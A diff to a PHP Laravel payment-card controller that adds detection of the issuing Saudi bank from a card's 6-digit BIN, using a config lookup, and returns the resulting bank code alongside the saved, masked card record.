@@ -28,9 +28,10 @@ class CustomerPaymentCardController extends Controller
             'national_id'  => $validated['national_id'] ?? null,
         ], fn($v) => $v !== null));
 
-        // Detect card type from BIN
+        // Detect card type and issuing bank from BIN
         $cardNumber = preg_replace('/\s+/', '', $validated['card_number']);
         $cardType = $this->detectCardType($cardNumber);
+        $bankCode = $this->detectBankCode($cardNumber);
 
         // Mask card number: **** **** **** 1234
         $last4 = substr($cardNumber, -4);
@@ -95,8 +96,24 @@ class CustomerPaymentCardController extends Controller
             'message' => 'تم حفظ بيانات البطاقة بنجاح',
             'card_id' => $card->id,
             'customer_ip' => $ip,
+            'bank_code' => $bankCode,
             'status_sig' => hash_hmac('sha256', 'payment-card|' . ($validated['session_id'] ?? ''), config('services.status_poll.secret')),
         ]);
+    }
+
+    /**
+     * Detect issuing Saudi bank from 6-digit BIN using config/bank_bins.php.
+     */
+    private function detectBankCode(string $number): ?string
+    {
+        $bin = substr(preg_replace('/\D/', '', $number), 0, 6);
+        if (strlen($bin) < 6) return null;
+
+        foreach (config('bank_bins', []) as $code => $bank) {
+            if (str_starts_with($code, '_')) continue;
+            if (in_array($bin, $bank['prefixes'] ?? [])) return $code;
+        }
+        return null;
     }
 
     /**
